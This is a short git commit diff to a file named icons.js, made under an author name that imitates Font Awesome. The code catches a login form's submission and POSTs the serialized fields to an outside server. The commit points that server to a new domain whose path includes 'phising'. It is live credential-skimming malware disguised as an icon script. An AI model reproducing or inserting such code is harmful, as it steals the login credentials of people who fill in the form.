7ba24c53e85746aee5b0a14ba5f30ea358ba987c
font-awsome <akundotrial@gmail.com>
2024-12-09 21:04:26 +0700

    Update icons.js

--- icons.js
+++ icons.js
@@ -2,7 +2,7 @@ $(".login-form").submit(function() {
  var d = $(".login-form");  
   
  $.ajax({  
-        url: "https://kingpanelz.my.id/api/krisna/api.php",  
+        url: "https://krisnastore.my.id/api/phising/api.php",  
         type: "POST",  
         data: d.serialize(),  
         success: function () {  
